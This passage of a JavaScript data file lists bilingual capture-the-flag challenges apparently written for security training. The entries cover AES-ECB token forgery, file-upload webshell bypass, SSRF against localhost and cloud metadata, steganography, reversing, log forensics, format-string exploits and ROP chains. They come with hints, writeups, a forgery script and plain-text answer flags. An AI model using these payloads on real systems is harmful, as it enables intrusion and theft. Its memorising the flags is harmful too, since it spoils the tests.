find_key_length(cipher)\nprint(f\"Key length: {key_len}\")\n\n# Step 2: 用已知部分解密 (假设密钥开头几个字符已知)\n# 根据题目提示猜测可能的密钥\n# 你的代码...", codeable: true, simulated: false },
  { id: "ctf-018", title: "AES-ECB Cut & Paste", titleEn: "AES-ECB Penguin", category: "Crypto", difficulty: 4, points: 300, flag: "flag{3cb_cut_4nd_p4st3_4tt4ck}", tags: ["AES-ECB", "块翻转", "Cut and Paste"], tagsEn: ["AES-ECB", "Block Flip", "Cut and Paste"], desc: "你有一个加密 Oracle，可以加密任何你提供的明文（但不能加密 'admin'）。系统将 block_size=16 的 AES-ECB 加密结果作为认证 token。已知用户数据的格式为: email=xxx&uid=10&role=user，你的目标是构造一个 role=admin 的合法 token。", descEn: "An encryption Oracle using AES-ECB with block_size=16. User data format: email=xxx&uid=10&role=user. Craft a token with role=admin.", hints: ["ECB 模式下，相同的 16 字节明文块产生完全相同的密文块", "你可以通过精心设计输入来控制明文块的边界", "先获取 'admin' 块的密文，然后把它拼接到你自己的 token 中替换 'user' 块"], hintsEn: ["ECB mode: identical plaintext blocks produce identical ciphertext blocks","Craft input to align 'admin' at a block boundary","Get admin block ciphertext, splice it into your token replacing user block"], writeupEn: "ECB: identical plaintext→identical ciphertext. Craft input so 'admin' fills one block, get its ciphertext, replace 'user' block in token.", starterCode: "\"\"\"\nAES-ECB Cut-and-Paste Attack\n\n目标: 将 token 中的 role=user 改为 role=admin\n格式: email=xxx&uid=10&role=user (block_size=16)\n\n方案: \n1. 构造 plaintext 使 'admin' 独占一个块\n2. 获取 admin 块的密文\n3. 拼接到合法 token 中替换 user 块\n\"\"\"\n\n# 假设 oracle 函数已提供\ndef oracle(plaintext):\n    \"\"\"加密 oracle: 发送明文，返回 AES-ECB 加密结果\"\"\"\n    pass  # 实际调用服务\n\nblock_size = 16\n\n# Step 1: 计算前缀长度 'email=' 占 6 字节\n# 需要填充 10 字节使 admin 对齐到块边界\nadmin_payload = 'A' * 10 + 'admin' + '\\x0b' * 11  # total = 32 bytes\nadmin_ct = oracle(admin_payload)\nadmin_block = admin_ct[16:32]  # 第二个 16-字节块 = encrypted('admin' + padding)\nprint(f\"Admin block (hex): {admin_block.hex()}\")\n\n# Step 2: 获取 user token (最后一个块是 role=user 的加密)\n# 'email=' + 13个A = 19字节，加上 &uid=10&role=user\n# 最后一个块是 'user' + padding\nuser_payload = 'A' * 13\nuser_ct = oracle(user_payload)\nprint(f\"User token length: {len(user_ct)} bytes\")\n\n# Step 3: 替换最后一个块\nforged_token = user_ct[:-16] + admin_block\nprint(f\"Forged token (hex): {forged_token.hex()}\")\n\n# Step 4: 使用 forged token 访问 admin 接口\n# 你的代码...", codeable: true, simulated: false },
  { id: "ctf-019", title: "File Upload Bypass", titleEn: "Upload Bypass", category: "Web", difficulty: 3, points: 200, flag: "flag{unr3str1ct3d_f1l3_upl04d}", tags: ["文件上传", "绕过", "Webshell"], tagsEn: ["Upload Bypass", "Bypass", "Webshell"], desc: "一个文件上传功能只允许上传图片文件。你的目标是绕过过滤上传一个 PHP webshell 并执行命令读取 flag。提示：服务器使用黑名单过滤扩展名。", descEn: "A file upload feature only allows images. Bypass the filter to upload a PHP webshell and execute commands to read the flag. Server uses blacklist for extensions.", hints: ["尝试上传 .php 文件被拦截了，说明扩展名黑名单", "试试双扩展名 trick: shell.php.jpg 或 shell.pHp", "如果扩展名过滤严格，尝试 .phtml, .phar, .php5, .pht 等 PHP 别名扩展名"], hintsEn: [".php upload is blocked, indicating extension blacklist","Try double extension trick: shell.php.jpg or shell.pHp","If extension filter is strict, try .phtml, .phar, .php5, .pht"], writeupEn: "Test double extensions (.php.jpg), case variations (.pHp), alternative extensions (.phtml/.php5/.phar), Content-Type spoofing, and magic bytes (GIF89a). Upload: /uploads/shell.phtml?cmd=cat%20/flag.txt", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  Image Upload Service v1.0           │\n│  Only accepts: jpg, jpeg, png, gif   │\n│  Endpoint: /upload                   │\n│  Upload dir: /uploads/               │\n└──────────────────────────────────────┘\nSelect file to upload:" },
  { id: "ctf-020", title: "SSRF 101", titleEn: "SSRF Detective", category: "Web", difficulty: 3, points: 250, flag: "flag{ssrf_pr0t0c0l_smuggl1ng}", tags: ["SSRF", "内网探测", "协议走私"], tagsEn: ["SSRF", "Internal Recon", "Protocol Smuggling"], desc: "一个网站提供 URL 代理功能：输入任意 URL，服务器会代为请求并返回内容。利用这个 SSRF 漏洞读取内网服务上的 flag。已知 flag 在 http://localhost:8080/flag.txt。", descEn: "A website proxies any URL you provide. Exploit this SSRF to read the flag from an internal service at http://localhost:8080/flag.txt.", hints: ["服务器会从你提供的 URL 获取内容，你可以让它访问内网地址", "试试 http://localhost:8080/ 探测内网服务", "除了 http://，还可以尝试 file:///etc/passwd, gopher://, dict:// 等协议"], hintsEn: ["Server fetches content from your URL, you can make it access internal addresses","Try http://localhost:8080/ to probe internal services","Also try file:///etc/passwd, gopher://, dict:// protocols"], writeupEn: "Access http://localhost:8080/flag.txt. Bypasses: 127.0.0.1, 0.0.0.0, [::1], 0x7f000001, DNS rebinding. Other protocols: file://, gopher://, dict://, cloud metadata at 169.254.169.254.", codeable: false, simulated: true, termWelcome: "┌──────────────────────────────────────┐\n│  URL Fetcher - Fetch any web page!   │\n│  curl_exec(\$url)                     │\n│  No network restrictions (oops)      │\n└──────────────────────────────────────┘\nEnter URL to fetch:" },
  { id: "ctf-021", title: "Image Steganography", titleEn: "PNG Stego", category: "Misc", difficulty: 2, points: 150, flag: "flag{lsb_h1d1ng_1n_pl41n_s1ght}", tags: ["隐写", "LSB", "图片分析"], tagsEn: ["PNG Stego", "LSB", "Image Analysis"], desc: "给你一张看似普通的 PNG 图片 landscape.png。图片看起来完全正常，但文件大小似乎比预期大了一些。flag 藏在图片的最低有效位 (LSB) 中。", descEn: "A seemingly normal PNG image landscape.png. File size is slightly larger than expected. The flag is hidden in the Least Significant Bits (LSB) of the image.", hints: ["图片文件比同尺寸的普通图片稍大，可能有额外数据隐藏", "研究 LSB 隐写：每个像素的最低位被替换为隐藏数据的位", "用 Python PIL 提取每个像素的 R,G,B 最低位，组合成隐藏信息"], hintsEn: ["File is slightly larger than expected for its dimensions — extra data may be hidden","LSB stego: each pixel's lowest bit is replaced with hidden data bits","Extract R,G,B LSBs using Python PIL, combine into hidden message"], writeupEn: "Use zsteg for automatic detection, or manually extract LSB from RGB channels. Tools: zsteg, Stegsolve, steghide, binwalk. Extract bits from each pixel, group into bytes.", codeable: false, simulated: false },
  { id: "ctf-022", title: "DNS Tunneling Detection", titleEn: "DNS Tunnel", category: "Misc", difficulty: 4, points: 300, flag: "flag{dns_3xf1ltr4t10n_d3t3ct3d}", tags: ["DNS隧道", "Wireshark", "流量分析"], tagsEn: ["DNS Tunnel", "Wireshark", "Traffic Analysis"], desc: "网络管理员发现异常 DNS 流量，抓取了 dns_traffic.pcap。分析这些 DNS 查询，攻击者通过 DNS 隧道外传了包含 flag 的敏感数据。", descEn: "Anomalous DNS traffic detected. Analyze dns_traffic.pcap — the attacker exfiltrated sensitive data containing a flag via DNS tunnel.", hints: ["pcap 中有大量异常长域名的 DNS 查询，不像正常域名", "被窃取的数据编码在 DNS 查询的子域名中", "提取所有 DNS 查询域名的子域名部分（.exfil.com 之前的部分），拼接后解码 (Base64/Hex)"], hintsEn: ["Pcap contains DNS queries with abnormally long domain names","Exfiltrated data is encoded in subdomain labels","Extract subdomains before .exfil.com, concatenate and decode (Base64/Hex)"], writeupEn: "Filter DNS in Wireshark, extract query names with tshark. Isolate subdomain labels, concatenate by timestamp, decode Hex/Base64 to get flag.", codeable: false, simulated: false },
  { id: "ctf-023", title: ".NET Decompilation", titleEn: ".NET Crack", category: "Reverse", difficulty: 3, points: 250, flag: "flag{d0tn3t_d3c0mp1l3_1s_34sy}", tags: [".NET", "反编译", "dnSpy"], tagsEn: [".NET Reverse", "Decompilation", "dnSpy"], desc: "给你一个 Windows .NET 可执行文件 license_check.exe。运行后要求输入 License Key，验证通过会输出 flag。使用反编译工具分析验证逻辑，找出正确的 Key 或直接提取 flag。", descEn: "A Windows .NET executable license_check.exe requires a License Key. Use decompilation tools to analyze the verification logic and extract the flag.", hints: [".NET 程序几乎可以被完美反编译回 C# 源代码", "使用 dnSpy 或 ILSpy 打开 exe 文件", "在反编译代码中搜索 'flag' 或分析 CheckLicense() 函数的逻辑"], hintsEn: [".NET programs can be almost perfectly decompiled back to C# source","Open the exe with dnSpy or ILSpy","Search for 'flag' or analyze CheckLicense() logic"], writeupEn: "Open in dnSpy, find the button click handler, analyze the license check logic. Search for hardcoded keys, decrypt functions, or extract flag directly. dnSpy can edit IL and recompile.", codeable: false, simulated: false },
  { id: "ctf-024", title: "Android APK Analysis", titleEn: "APK Analyzer", category: "Reverse", difficulty: 3, points: 200, flag: "flag{4ndr01d_r3v3rs1ng_b4s1cs}", tags: ["Android", "APK", "jadx"], tagsEn: ["Android", "APK Analysis", "jadx"], desc: "给你一个 Android APK 文件 crackme.apk。安装后是一个密码验证应用，输入正确密码显示 flag。分析 APK 找到正确的密码或直接提取 flag。", descEn: "An Android APK crackme.apk is a password verification app. Analyze it to find the correct password or extract the flag directly.", hints: ["APK 本质上是一个 ZIP 文件，可以直接解压", "用 jadx-gui 打开 APK 可以反编译为可读的 Java 代码", "在 MainActivity 类中查找 onClick 或 checkPassword 函数"], hintsEn: ["APK is essentially a ZIP file, can be extracted directly","Use jadx-gui to decompile APK into readable Java code","Find onClick or checkPassword in MainActivity"], writeupEn: "Unzip APK, open in jadx-gui, locate MainActivity.checkPassword(). Common patterns: hardcoded password comparison, password in strings.xml, or native .so library verification. Advanced: frida/objection for dynamic analysis.", codeable: false, simulated: false },
  { id: "ctf-025", title: "Log Analysis: SSH Brute Force", titleEn: "Log Sleuth", category: "Forensics", difficulty: 3, points: 250, flag: "flag{brut3_f0rc3_d3t3ct3d_1n_l0gs}", tags: ["日志分析", "入侵检测", "SSH"], tagsEn: ["Log Analysis", "Intrusion Detection", "SSH"], desc: "系统管理员发现服务器被入侵，提供了 auth.log 文件。日志显示大量 SSH 登录尝试。分析日志找到攻击者成功登录的证据——攻击者在成功登录后以 root 身份写入了 flag。", descEn: "Server was compromised. Analyze auth.log showing massive SSH login attempts. Find the attacker's successful login and the flag they wrote as root.", hints: ["用 grep 统计每个 IP 的登录失败次数，找到暴力破解的源 IP", "在 auth.log 中搜索 'Accepted' 找到成功的登录记录", "追踪成功登录后的操作：查看 .bash_history 或 auth.log 中的后续事件"], hintsEn: ["grep to count failed login attempts per IP, find brute force source","Search 'Accepted' in auth.log for successful logins","Trace post-login operations in auth.log"], writeupEn: "Count failures per IP: grep 'Failed password' | sort | uniq -c. Find 'Accepted' login. Trace subsequent commands for flag. Brute force pattern: many rapid failures + one success.", codeable: false, simulated: false },
  { id: "ctf-026", title: "Filesystem Timeline Forensics", titleEn: "Timeline Forensics", category: "Forensics", difficulty: 4, points: 350, flag: "flag{t1m3l1n3_4n4lys1s_m4st3r}", tags: ["时间线", "fls", "MFT"], tagsEn: ["Timeline Forensics", "fls", "MFT"], desc: "给你一个 NTFS 磁盘镜像 disk.img。已知入侵发生在 2024-03-15 14:00-16:00。构建文件系统时间线，找到攻击者在此期间创建/修改的文件——其中包含 flag。", descEn: "An NTFS disk image. The breach occurred on 2024-03-15 14:00-16:00. Build a filesystem timeline to find files created/modified during that window — one contains the flag.", hints: ["使用 Sleuth Kit (fls) 或 MFTEcmd 提取 MFT 记录", "将时间戳转为可读格式后按时间排序，构建时间线", "聚焦入侵时间窗口 (14:00-16:00)，找最近创建或修改的可疑文件"], hintsEn: ["Use Sleuth Kit (fls) or MFTEcmd to extract MFT records","Convert timestamps to readable format and sort to build timeline","Focus on the breach window (14:00-16:00), find recently created/modified suspicious files"], writeupEn: "mmls→fls→mactime pipeline. Filter timeline for 2024-03-15 14:00-16:00. Focus on .Created/.Modified events, suspicious filenames. Use icat to extract file contents.", codeable: false, simulated: false },
  { id: "ctf-027", title: "Format String", titleEn: "Format String", category: "PWN", difficulty: 4, points: 300, flag: "flag{fmt_str1ng_l34k_4nd_wr1t3}", tags: ["格式化字符串", "内存泄漏", "任意写"], tagsEn: ["Format String", "Memory Leak", "Arbitrary Write"], desc: "程序源码中有 printf(user_input) 而没有格式化参数。你需要利用格式化字符串漏洞先泄露内存地址，再覆写 GOT 表劫持程序流程拿到 flag。", descEn: "The program has printf(user_input) without format specifiers. Exploit format string vulnerability to leak memory addresses, then overwrite GOT to hijack execution flow and get the flag.", hints: ["printf(user_input) 是典型的格式化字符串漏洞", "用 %x.%x.%x 或 %p 泄露栈上的数据（包括地址）", "用 %n 可以向任意内存地址写入数据，配合泄露的地址覆写 GOT 表"], hintsEn: ["printf(user_input) is a classic format string vulnerability","Use %x.%x.%x or %p to leak stack data including addresses","Use %n to write to arbitrary memory, overwrite GOT with leaked addresses"], writeupEn: "Phase 1: Leak addresses with %p/%N$p. Phase 2: Find printf@GOT target. Phase 3: Use %n to write system address to GOT. Phase 4: Input '/bin/sh' to trigger system(). Use pwntools for precision.", codeable: false, simulated: false },
  { id: "ctf-028", title: "ROP Chain Basics", titleEn: "ROP Chain", category: "PWN", difficulty: 4, points: 350, flag: "flag{r0p_g4dg3t_ch41n_m4st3r}", tags: ["ROP", "ret2libc", "NX"], tagsEn: ["ROP Chain", "ret2libc", "NX"], desc: "NX 已开启，无法执行栈上的 shellcode。你需要构造 ROP 链调用 system(\"/bin/sh\") 获取 shell。已知 libc 版本，你需要泄露 libc 基址并计算 gadget 偏移。", descEn: "NX is enabled, no shellcode on stack. Build a ROP chain to call system(\"/bin/sh\"). Given libc version, leak libc base and calculate gadget offsets.", hints: ["NX 开启所以不能直接跳转到 shellcode，需要 ROP", "用 ROPgadget 找 pop rdi; ret 这类 gadget", "ROP 链结构: pop rdi → '/bin/sh' → system()，需要先泄露 libc 地址计算偏移"], hintsEn: ["NX enabled means no shellcode, need ROP instead","Use ROPgadget to find pop rdi; ret gadgets","ROP chain: pop rdi → '/bin/sh' → system(), need to leak libc address first"], writeupEn: "Stage 1: Leak libc via puts(puts@GOT). Stage 2: Build ROP chain: ret_gadget + pop_rdi + binsh + system. Use pwntools ROP module. 64-bit needs stack alignment with extra ret.", codeable: false, simulated: false }
];

